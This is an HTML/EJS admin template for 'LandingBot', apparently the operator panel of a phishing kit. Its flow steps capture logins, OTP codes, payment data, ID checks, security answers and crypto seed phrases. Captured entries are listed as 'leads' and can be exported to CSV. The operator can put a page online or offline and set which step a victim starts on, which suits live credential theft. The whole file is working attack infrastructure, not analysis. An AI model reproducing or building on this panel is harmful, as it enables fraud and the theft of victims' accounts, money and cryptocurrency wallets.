<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><%= page.title %> — LandingBot</title>
<style>
:root{
  --bg:#0e1116;--surface:#161b22;--surface2:#1c232d;--surface3:#21282f;
  --line:#2a323d;
  --ink:#e8eaed;--ink2:#aab1bb;--ink3:#79818c;--ink4:#4a5160;
  --accent:#4b93ff;--accent-soft:#16273f;
  --good:#4ac57e;--good-soft:#12261a;--good-dim:#0e1e14;
  --warn:#e0ad46;--warn-soft:#2a2410;
  --crit:#f0766b;--crit-soft:#2c1512;
  --purple:#a371f7;--purple-soft:#221a35;
  --cyan:#39c5cf;--cyan-soft:#0d2226;
  --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
  --mono:ui-monospace,"Cascadia Code","Roboto Mono",Menlo,Consolas,monospace;
  --r8:8px;--r12:12px;--r16:16px;
}
*{box-sizing:border-box;margin:0;padding:0}
html{scrollbar-width:thin;scrollbar-color:var(--line) var(--bg)}
body{background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:14px;min-height:100vh}
a{color:inherit;text-decoration:none}

/* ── Topbar ─────────────────────────────────────── */
.topbar{height:52px;display:flex;align-items:center;gap:12px;padding:0 20px;
        background:var(--surface);border-bottom:1px solid var(--line);
        position:sticky;top:0;z-index:200}
.tb-back{display:flex;align-items:center;gap:6px;color:var(--ink3);font-size:.82rem;
         padding:5px 10px;border-radius:var(--r8);border:1px solid var(--line);transition:.15s}
.tb-back:hover{color:var(--ink);background:var(--surface2)}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:8px}

/* ── Layout ─────────────────────────────────────── */
.wrap{max-width:1100px;margin:0 auto;padding:24px 20px 80px}

/* ── Page header ────────────────────────────────── */
.ph{display:flex;justify-content:space-between;align-items:flex-start;
    flex-wrap:wrap;gap:14px;margin-bottom:24px}
.ph-left h1{font-size:1.4rem;font-weight:700;margin-bottom:8px}
.ph-meta{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.ph-actions{display:flex;gap:8px;flex-wrap:wrap}

/* ── Badges / Pills ─────────────────────────────── */
.badge{padding:3px 10px;border-radius:99px;font-size:.74rem;font-weight:600;
       display:inline-flex;align-items:center;gap:4px;white-space:nowrap}
.b-on   {background:var(--good-soft);color:var(--good);border:1px solid #4ac57e33}
.b-off  {background:var(--crit-soft);color:var(--crit);border:1px solid #f0766b33}
.b-online{background:#1e3a8a22;color:#93c5fd;border:1px solid #93c5fd33}
.b-offline{background:var(--warn-soft);color:var(--warn);border:1px solid #e0ad4633}
.step-tag{padding:2px 8px;border-radius:6px;font-size:.72rem;font-weight:600;font-family:var(--mono)}
.form-login      {background:#1e3a5f30;color:#60a5fa}
.form-otp        {background:#14532d30;color:#4ade80}
.form-payment    {background:#78350f30;color:#fcd34d}
.form-seed_phrase,.form-otp_long{background:#4c1d9530;color:#c4b5fd}
.form-verify,.form-id_verify{background:#1c191730;color:#d6d3d1}
.form-security_q {background:#1a2e3a30;color:#7dd3fc}
.form-checkpoint,.form-locked,.form-confirm,.form-complete{background:#1f293730;color:#9ca3af}

/* ── Stat pills ─────────────────────────────────── */
.stat-pill{display:inline-flex;align-items:center;gap:5px;font-size:.85rem}
.stat-pill .val{font-weight:700;color:var(--accent)}
.stat-pill.leads .val{color:var(--good)}

/* ── Cards ──────────────────────────────────────── */
.card{background:var(--surface);border:1px solid var(--line);border-radius:var(--r12);padding:20px 22px;margin-bottom:16px}
.card-title{font-size:.72rem;font-weight:600;text-transform:uppercase;letter-spacing:.06em;
            color:var(--ink3);font-family:var(--mono);margin-bottom:16px}

/* ── Grids ──────────────────────────────────────── */
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.grid3{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px}
@media(max-width:700px){.grid2,.grid3{grid-template-columns:1fr}}

/* ── Toggle panel ────────────────────────────────── */
.toggle-panel{background:var(--surface2);border:1px solid var(--line);border-radius:var(--r12);padding:16px}
.toggle-panel .tp-label{font-size:.75rem;color:var(--ink3);font-family:var(--mono);margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em}
.toggle-panel .tp-val{font-size:1rem;font-weight:700;margin-bottom:12px}

/* ── Step card ───────────────────────────────────── */
.step-card{background:var(--surface2);border:1.5px solid var(--line);border-radius:var(--r8);
           padding:12px 14px;transition:.15s}
.step-card:hover{border-color:var(--accent)}
.step-card-name{font-size:.82rem;font-weight:600;color:var(--accent);
                margin-bottom:4px;display:flex;align-items:center;gap:6px}
.step-card-fields{font-size:.72rem;color:var(--ink4);margin-bottom:7px}
.step-card a{font-size:.78rem;color:var(--cyan)}

/* ── URL block ───────────────────────────────────── */
.url-block{display:flex;align-items:center;gap:8px;background:var(--surface2);
           border:1px solid var(--line);border-radius:var(--r8);padding:10px 14px}
.url-block span{font-family:var(--mono);font-size:.82rem;color:var(--ink2);flex:1;
                white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.btn-copy{background:var(--surface);color:var(--ink3);border:1px solid var(--line);
          padding:4px 10px;border-radius:6px;font-size:.72rem;cursor:pointer;
          font-family:var(--mono);transition:.15s}
.btn-copy:hover{color:var(--ink);background:var(--surface3)}
.btn-copy.copied{background:var(--good-dim);color:var(--good);border-color:#4ac57e33}

/* ── Buttons ─────────────────────────────────────── */
.btn{padding:8px 16px;border-radius:var(--r8);border:none;cursor:pointer;
     font-size:.82rem;font-family:inherit;font-weight:600;transition:.15s;
     display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
.btn-primary{background:var(--accent);color:#fff}
.btn-primary:hover{filter:brightness(1.1)}
.btn-ghost{background:transparent;color:var(--ink3);border:1px solid var(--line)}
.btn-ghost:hover{color:var(--ink);background:var(--surface2)}
.btn-good{background:var(--good-soft);color:var(--good);border:1px solid #4ac57e33}
.btn-good:hover{filter:brightness(1.1)}
.btn-warn{background:var(--warn-soft);color:var(--warn);border:1px solid #e0ad4633}
.btn-warn:hover{filter:brightness(1.1)}
.btn-crit{background:var(--crit-soft);color:var(--crit);border:1px solid #f0766b33}
.btn-crit:hover{filter:brightness(1.1)}
.btn-sm{padding:5px 10px;font-size:.76rem;border-radius:7px}

/* ── Leads table ─────────────────────────────────── */
.tbl-wrap{overflow-x:auto;border-radius:var(--r8);border:1px solid var(--line)}
table{width:100%;border-collapse:collapse;font-size:.82rem}
thead tr{background:var(--surface2)}
th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--line)}
th{color:var(--ink3);font-weight:600;font-family:var(--mono);font-size:.7rem;
   text-transform:uppercase;letter-spacing:.05em}
tr:last-child td{border-bottom:none}
tr:hover td{background:var(--surface2)}
.td-data{font-family:var(--mono);font-size:.76rem;color:var(--ink2);
         max-width:340px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

/* ── Form inputs ─────────────────────────────────── */
.field{margin-bottom:14px}
.field label{display:block;font-size:.75rem;color:var(--ink3);font-family:var(--mono);
             text-transform:uppercase;letter-spacing:.04em;margin-bottom:5px}
input,select{width:100%;padding:9px 12px;border-radius:var(--r8);
             border:1px solid var(--line);background:var(--bg);
             color:var(--ink);font-family:inherit;font-size:.88rem}
input:focus,select:focus{outline:none;border-color:var(--accent)}

/* ── Toast ───────────────────────────────────────── */
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);
       background:var(--surface);border:1px solid var(--line);color:var(--ink);
       padding:10px 22px;border-radius:12px;font-size:.88rem;opacity:0;
       transition:.3s;pointer-events:none;z-index:999;box-shadow:0 4px 20px #0008}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
.toast.ok{border-color:#4ac57e55;background:var(--good-dim);color:var(--good)}
.toast.err{border-color:#f0766b55;background:var(--crit-soft);color:var(--crit)}

.divider{height:1px;background:var(--line);margin:16px 0}
.empty{padding:32px;text-align:center;color:var(--ink4)}
</style>
</head>
<body>

<div class="topbar">
  <a class="tb-back" href="/admin">
    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 2L4 6l4 4"/></svg>
    Dashboard
  </a>
  <span style="font-weight:600;font-size:.9rem"><%= page.title %></span>
  <div class="tb-right">
    <a href="/p/<%= page.slug %>" target="_blank" class="btn btn-ghost btn-sm">
      <svg width="10" height="10" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M7 1h4v4M11 1L5 7"/><path d="M5 3H2a1 1 0 00-1 1v6a1 1 0 001 1h6a1 1 0 001-1V8"/></svg>
      View Page
    </a>
  </div>
</div>

<div class="wrap">

  <!-- ── Page Header ─────────────────────────────── -->
  <div class="ph">
    <div class="ph-left">
      <h1><%= page.title %></h1>
      <div class="ph-meta">
        <span style="font-size:.82rem;color:var(--ink3)">Template: <strong style="color:var(--ink2)"><%= page.template_name %></strong></span>
        <span class="badge <%= page.active == 1 ? 'b-on' : 'b-off' %>">
          <span style="width:6px;height:6px;border-radius:50%;background:currentColor;flex-shrink:0"></span>
          <%= page.active == 1 ? 'Active' : 'Inactive' %>
        </span>
        <span class="badge <%= page.mode === 'offline' ? 'b-offline' : 'b-online' %>">
          <%= page.mode === 'offline' ? 'Offline' : 'Online' %>
        </span>
        <span class="stat-pill">
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="6" cy="4" r="2"/><path d="M1 10c0-2.5 2-4 5-4s5 1.5 5 4"/></svg>
          <span class="val"><%= page.views || 0 %></span> views
        </span>
        <span class="stat-pill leads">
          <span class="val"><%= leads.length %></span> leads
        </span>
      </div>
    </div>
    <div class="ph-actions">
      <form method="POST" action="/admin/pages/<%= page.id %>/toggle-active" style="display:inline">
        <input type="hidden" name="_csrf" value="<%= csrfToken %>">
        <button type="submit" class="btn <%= page.active == 1 ? 'btn-warn' : 'btn-good' %> btn-sm">
          <%= page.active == 1 ? 'Deactivate' : 'Activate' %>
        </button>
      </form>
    </div>
  </div>

  <!-- ── Live URL ────────────────────────────────── -->
  <div class="card" style="margin-bottom:16px">
    <div class="card-title">Live URL</div>
    <div class="url-block">
      <span id="urlText"><%= typeof siteBase !== 'undefined' ? siteBase : '' %>/p/<%= page.slug %></span>
      <button class="btn-copy" id="urlCopyBtn" onclick="copyUrl()">Copy</button>
      <a href="/p/<%= page.slug %>" target="_blank" class="btn btn-ghost btn-sm">Open</a>
    </div>
  </div>

  <!-- ── Mode + Flow ─────────────────────────────── -->
  <div class="card">
    <div class="card-title">Mode & Flow Control</div>
    <div class="grid2" style="margin-bottom:18px">

      <div class="toggle-panel">
        <div class="tp-label">Current Mode</div>
        <div class="tp-val">
          <span class="badge <%= page.mode === 'offline' ? 'b-offline' : 'b-online' %>">
            <%= page.mode === 'offline' ? 'Offline (Closed)' : 'Online (Live)' %>
          </span>
        </div>
        <form method="POST" action="/admin/pages/<%= page.id %>/mode">
          <input type="hidden" name="_csrf" value="<%= csrfToken %>">
          <button type="submit" class="btn <%= page.mode === 'offline' ? 'btn-good' : 'btn-warn' %>" style="width:100%">
            <%= page.mode === 'offline' ? 'Go Online' : 'Go Offline' %>
          </button>
        </form>
      </div>

      <div class="toggle-panel">
        <div class="tp-label">Default Start Step</div>
        <form method="POST" action="/admin/pages/<%= page.id %>/flow-step">
          <input type="hidden" name="_csrf" value="<%= csrfToken %>">
          <select name="step" style="margin-bottom:10px">
            <option value="">— Auto (first step) —</option>
            <% tpl.pages.forEach(p => { %>
              <option value="<%= p.slug %>" <%= page.flow_step === p.slug ? 'selected' : '' %>><%= p.step_label || p.slug %></option>
            <% }) %>
          </select>
          <button type="submit" class="btn btn-ghost" style="width:100%">Apply</button>
        </form>
      </div>
    </div>

    <div style="font-size:.75rem;color:var(--ink4);font-family:var(--mono);
                text-transform:uppercase;letter-spacing:.05em;margin-bottom:10px">Flow Steps</div>
    <div class="grid3">
      <% tpl.pages.forEach((p, i) => { %>
        <div class="step-card">
          <div class="step-card-name">
            <span style="color:var(--ink4)"><%= i+1 %>.</span>
            <%= p.step_label || p.slug %>
            <span class="step-tag form-<%= p.form_type || p.layout %>"><%= p.form_type || p.layout %></span>
          </div>
          <div class="step-card-fields"><%= (p.fields||[]).join(', ') || 'no fields' %></div>
          <a href="/p/<%= page.slug %>/<%= p.slug %>" target="_blank">Preview ↗</a>
        </div>
      <% }) %>
    </div>
  </div>

  <!-- ── Leads ───────────────────────────────────── -->
  <div class="card">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
      <div class="card-title" style="margin:0">Leads (<%= leads.length %>)</div>
      <% if (leads.length) { %>
        <a href="/admin/pages/<%= page.id %>/export" class="btn btn-good btn-sm">
          <svg width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 1v7M3 5l3 3 3-3"/><path d="M1 10h10"/></svg>
          Export CSV
        </a>
      <% } %>
    </div>
    <% if (leads.length) { %>
      <div class="tbl-wrap">
        <table>
          <thead><tr><th>#</th><th>Step</th><th>Data</th><th>Date</th><th></th></tr></thead>
          <tbody>
          <% leads.forEach(l => {
            let d = {}; try { d = JSON.parse(l.data); } catch {}
            const step = d.step || 'submit';
            delete d.step; delete d._csrf; delete d._hp; delete d._step;
            const preview = Object.entries(d).map(([k,v]) => k+': '+v).join(' · ');
            const formType = tpl.pages.find(p=>p.slug===step)?.form_type || step;
            const stepLabel = tpl.pages.find(p=>p.slug===step)?.step_label || step;
          %>
            <tr>
              <td style="color:var(--ink4);font-family:var(--mono);font-size:.75rem"><%= l.id %></td>
              <td><span class="badge step-tag form-<%= formType %>"><%= stepLabel %></span></td>
              <td>
                <div style="display:flex;align-items:center;gap:8px">
                  <span class="td-data" title="<%= preview %>"><%= preview %></span>
                  <button class="btn-copy btn-sm" onclick="copyText(this,'<%= preview.replace(/'/g,"&#39;").replace(/\n/g,' ') %>')">Copy</button>
                </div>
              </td>
              <td style="font-family:var(--mono);font-size:.73rem;color:var(--ink4);white-space:nowrap"><%= l.created_at %></td>
              <td></td>
            </tr>
          <% }) %>
          </tbody>
        </table>
      </div>
    <% } else { %>
      <div class="empty">No leads yet.</div>
    <% } %>
  </div>

  <!-- ── Edit Form ────────────────────────────────── -->
  <div class="card">
    <div class="card-title">Edit Page</div>
    <form method="POST" action="/admin/pages/<%= page.id %>">
      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
      <div class="grid2">
        <div class="field"><label>Title</label><input name="title" value="<%= page.title %>" required></div>
        <div class="field"><label>Slug</label><input name="slug" value="<%= page.slug %>" required></div>
      </div>
      <div class="field"><label>Template ID</label><input name="template_id" value="<%= page.template_id %>"></div>
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px">
        <input type="checkbox" name="active" value="1" <%= page.active == 1 ? 'checked' : '' %> style="width:auto;accent-color:var(--accent)">
        <span style="font-size:.88rem;color:var(--ink2)">Page is active</span>
      </div>
      <input type="hidden" name="headline"    value="<%= page.headline    || '' %>">
      <input type="hidden" name="subheadline" value="<%= page.subheadline || '' %>">
      <input type="hidden" name="body"        value="<%= page.body        || '' %>">
      <input type="hidden" name="button_text" value="<%= page.button_text || 'Continue' %>">
      <input type="hidden" name="theme"       value="<%= page.theme       || 'dark' %>">
      <input type="hidden" name="pixel"       value="<%= page.pixel       || '' %>">
      <input type="hidden" name="fields"      value="<%= page.fields %>">
      <button type="submit" class="btn btn-primary">Save Changes</button>
    </form>
  </div>

  <!-- ── Bottom actions ───────────────────────────── -->
  <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:4px">
    <a href="/admin/templates?page_id=<%= page.id %>" class="btn btn-ghost">Change Template</a>
    <form method="POST" action="/admin/pages/<%= page.id %>/delete"
          onsubmit="return confirm('Delete page and all its leads? This cannot be undone.')">
      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
      <button class="btn btn-crit">Delete Page</button>
    </form>
  </div>

</div>

<div class="toast" id="toast"></div>

<script>
function toast(msg, type='ok', ms=2600) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  clearTimeout(t._t);
  t._t = setTimeout(() => t.classList.remove('show'), ms);
}
function copyText(btn, text) {
  navigator.clipboard.writeText(text).then(() => {
    btn.textContent = '✓';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    toast('Copied!');
  });
}
function copyUrl() {
  const url = document.getElementById('urlText').textContent;
  navigator.clipboard.writeText(url).then(() => {
    const btn = document.getElementById('urlCopyBtn');
    btn.textContent = '✓ Copied';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    toast('URL copied!');
  });
}
</script>
</body>
</html>
